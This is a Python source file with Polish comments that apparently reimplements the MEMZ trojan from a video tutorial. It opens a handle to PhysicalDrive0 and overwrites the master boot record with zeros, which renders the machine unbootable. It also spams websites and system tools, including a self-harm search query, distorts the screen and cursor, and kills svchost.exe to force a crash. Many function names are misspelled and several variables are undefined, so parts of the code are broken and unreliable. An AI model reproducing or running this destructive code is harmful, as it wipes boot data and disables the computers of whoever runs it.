# Przy robieniu tego korzystałem z tego poradnika:
# Link do poradnika >> https://www.youtube.com/watch?v=izNWyyWJ_Yc

'''
# Pamiątka:

timersub.start()
shnaking.start()
Sleep(10000)
blinking.start()
reverse.start
icons.start()
Sleep(10000)
opensites.terminate() # Stop oppening random sites
shnaking.terminate()
timersub.terminate() # Stop subtracking from timer varible
icons.terminate()
'''

print("STARTING MEMZ...")

# Wyjście z scriptu na innym systemie operacyjnym niż windows
import os
if os.name != 'nt':
    print("Operating system isn't windows, exit the code")
    exit()

# Ostatnie sprawdzenie czy system operacyjny to windows
if os.name == 'nt':
    from win32gui import *
    from win32api import *
    from win32ui import *
    import ctypes
    from ctypes import windll
    from win32con import *
    from win32file import *
    from random import randrange as rd
    from random import *
    import sys
    from sys import exit
    import multiprocessing
    import winreg as reg
    import winreg

    # Let's firstly make warning, that MEMZ is crealy know for.
    title = "! WARNING !"
    description = "The software you just executed is considered malware. " \
                "This malware will harm your computer and makes it unusable. " \
                "TYou run it at your own risk.\nIts creator is not responsible for any damage to your device" \
                "(it is recommended to test/run this file only on virtual machines or other isolated environments)." \
                "\n\nPress \"Yes\" to continue.\nPress \"No\" to exit"

    if MessageBox(description, title, MB_YESNO | MB_ICONWARNING) == IDNO: # If the user pressed no to our warning, exit the program
        sys.exit()
        exit()

    title = "!! LAST WARNING !!"
    description = "Are you 100 percent sure? There will be no turning back." \
                    "Yes, indeed, other files have already been executed, " \
                    "but none of those files were as harmful as this one. " \
                    "Because when you run this file, your computer will be " \
                    "completely destroyed and rendered unusable for a very, " \
                    "very long time, if not forever." \
                    "\n\nPress \"Yes\" to continue.\nPress \"No\" to exit"
    if MessageBox(description, title, MB_YESNO | MB_ICONWARNING) == IDNO: # If the user pressed no to our warning, exit the program
        sys.exit()
        exit()
    

    print("Uruchamiam memz...")

    # Frist payload, opening random websites. 
    # początek linku do wyszukiwania >> 'http://google.co.ck/search?q='
    class Data:
        sites = (
            "http://google.co.ck/search?q=How+to+remove+MEMZ.exe",
            "http://google.co.ck/search?q=best+way+to+kill+yourself",
            "http://google.co.ck/search?q=how+2+remove+a+virus",
            "http://google.co.ck/search?q=mcafee+vs+norton",
            "http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
            "http://google.co.ck/search?q=minecraft+hack+download+no+virus",
            "http://google.co.ck/search?q=how+to+get+money",
            "http://google.co.ck/search?q=bonzi+buddy+download+free",
            "http://google.co.ck/search?q=how+2+buy+weed",
            "http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
            "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
            "http://google.co.ck/search?q=g3t+r3kt",
            "http://google.co.ck/search?q=batch+virus+download",
            "http://google.co.ck/search?q=virus.exe",
            "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
            "http://google.co.ck/search?q=virus+builder+legit+free+download",
            "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
            "http://google.co.ck/search?q=how+to+create+your+own+malware",
            "http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
            "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happennin+plz+help",
            "http://google.co.ck/search?q=dank+memz",
            "http://google.co.ck/search?q=how+to+download+memz",
            "http://google.co.ck/search?q=half+live+3+release+date",
            "http://google.co.ck/search?q=is+illuminati+real",
            "http://google.co.ck/search?q=montage+parody+making+program+2016",
            "http://google.co.ck/search?q=the+memz+are+real",
            "http://google.co.ck/search?q=stanky+danky+maymays",
            "http://google.co.ck/search?q=john+cena+midi+legit+not+converted"
            "http://google.co.ck/search?q=vinesauce+meme+collection",
            "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
            "http://google.co.ck/search?q=free+robux+generator+no+virus+and+no+scam+real+working",
            "http://google.co.ck/search?q=fortnite+hacks+no+virus+and+no+scam",
            "http://google.co.ck/search?q=free+ram+no+virus+and+no+scam",
            "http://motherboard.vice.com/read/wath-this-malware-turn-a-computer-intro-a-digital-hellscape",
            "http://play.clubpenguin.com",
            "http://pcoptimizerpro.com",
            "http://softonic.com",
            "http://pornhub.com",
            "calc",
            "notepad",
            "cmd",
            "write",
            "regedit",
            "explorer",
            "taskmgr",
            "msconfig",
            "mspaint",
            "devmgmt.msc",
            "control",
            "mmc"
            # w przyszłości dodaj więcej linków jak chcesz
        )
        IconWarning = LoadIcon(None, 32515)
        IconError = LoadIcon(None, 32513)

    class MBR:
        # !! -- Never, ever! run this on your own machine. Plase using virtual machine e.g. VirtualBox
        # ctypes.windll.kernel32 << Na wszelki wypadek to tutaj zostawie
        def overwrite():
            handle = CreateFileW(r"\\.\PhysicalDrive0", # Path to MBR
                                 GENERIC_WRITE,           # Write permission
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, # Read and write...
                                 None,                    # Nothing as PySeciurity attribute
                                 OPEN_EXISTING,           # Pretty much self-explonitary
                                 0,0)                     # Create handle to MBR
            
            # So now, how do we make bootable program? We will need to go very low level, into assembly.
            buffer = bytes([
                0 for i in range(512) # temporary
            ])

            bytes_written = WriteFile(handle, buffer, None)

            # Relase the memory allocated to the handle
            CloseHandle(handle)

        overwrite()

    time = 0
    timeSubtrack = 15000

    class Payloads:
        def open_sites():
            global timeSubtrack
            sites = Data.sites
            global time
            for i in range(0, 10): #while true:
                __import__("os").system("start " + str(choice(sites)))
                Sleep(timeSubtrack-time)
        def decrease_timer():
            global time
            while time < 15000:
                time += 1
                Sleep(10)
        def blink_screen():
            global time 
            global timeSubtrack
            HDC = GetDC(0) # Get the frist monitor
            sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1)) # Get screen width and height
            while True:
                Sleep(timeSubtrack-time)
                ParBit(HDC, 0,0,x,y, PATINVERT) # Invert the entire monitor! I know it sounds crazy!
        def reverse_text():
            global time 
            global timeSubTrack
            HWND = GetDesktopWindow() # This really is wheare we want to check for all open windows.
            while True:
                EmunChildWindows(HWND, EmuChildProc, None) # Emurate through all open windows and apply the text change to them.
                Sleep(timeSubtrack-time)
        def error_drawing():
            global time
            global timeSubtrack
            HDC = GetDC(0) # Frist monitor
            sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1)) # Get screen width and height
            while True:
                DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning) # Draw the warning icon randomly on the screen
                for i in range(0,60):
                    mouseX,mouseY = GetCursorPos() # Cursor positions
                    DrawIcon(HDC, mouseX, mouseY, Data.IconError) # Draw icon on mouse
                    Sleep(10)
        def warning_spam():
            global time
            global timeSubtrack
            while True:
                warning = multiprocessing.Process(target = msboxTheard)
                Sleep(timeSubtrack-time)
        def screen_puzzle():
            global time
            global timeSubtrack
            HDC = GetDC(0) # Get frist monitor
            sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1)) # Get screen width and height

            # Generate box position
            x1 = rd(sw-100)
            y1 = rd(sh-100)
            x2 = rd(sw-100)
            y2 = rd(sh-100)

            width = rd(600)
            height = rd(600)

            while True:
                BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
                Sleep(timeSubtrack-time)
        def cursor_shnake():
            global time
            global timeSubtrack
            while True:
                x,y = GetCursorPos() # Get cursor position

                # Calculate new cursor positions
                newX = x + (rd(3)-1) * rd(int(time+1)/2200+2)
                newY = y + (rd(3)-1) * rd(int(time+1)/2200+2)

                SetCursorPos((newX, newY)) # Set the cursor position

                Sleep(2)
        def tunnel_effect():
            global time
            global timeSubtrack
            sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1)) # Get screen width and height
            HDC = GetDC(0) # Get the frist monitor
            while True:
                StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
                Sleep(time-timeSubtrack)

    def msgboxTheard():
        MessageBox("still using this computer?", "LOL", MB_OK | MB_ICONWARNING)
    def EnumChildProc(hwnd, LParam):
        try:
            buffering = PyMakeBuffer(255) # Create buffering
            length = SendMessage(hwnd, WM_GETTEXT, 255, buf) # Get length 
            result = buf[0:length*2].tobytes().decode('utf-16') # Looks really complicated, I know but it isn't really.
            # Let's revarse the text:
            rsult = result[::-1]

            SendMessage(hwnd, VM_GETTEXT, None, result) # Set the windows text.
        except: pass

            # Well, now we got this, but how do we run this piece of code on every open window? 
            #Wellm, we can enumerate throgh all of the windows using the EnumChildWindows function.

    if __name__ == '__main__':
        p = Payloads()

        #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        opensites = multiprocessing.Process(target = p.open_sites)
        timersub = multiprocessing.Process(target = p.decrease_timer)
        reverse = multiprocessing.Process(target = p.reverse_text)
        blinking = multiprocessing.Process(target = p.blink_screen)
        icons = multiprocessing.Process(target = p.error_drawing)
        shnaking = multiprocessing.Process(target = p.cursor_shnake)
        tunneling = multiprocessing.Process(target = p.tunnel_effect)
        puzzling = multiprocessing.Process(target = p.screen_puzzle)
        errors = multiprocessing.Process(target = p.warning_spam)

        timersub.start() # Slowly start subtracking from the timer, grandully increasing the spead of all payloads
        opensites.start() # Start opening random websites, aka the one you entered in the verible sites
        shnaking.start() # Start shnaking mouse coursor
        Sleep(timeSubtrack*2)
        blinking.start() # Start invarting the entire screen
        icons.start() # Start drawing icons
        Sleep(7000*2)
        reverse.start() # Start reversing text displayed
        puzzling.start() # Start the screen puzzle effect
        errors.start() # Start the error massage boxes
        Sleep(5000*2)
        tunneling.start()
        while time < 15000:
            sleep(10)
        __import__("os").system("taskkill /f /IM svchost.exe") # Cause a BSOD
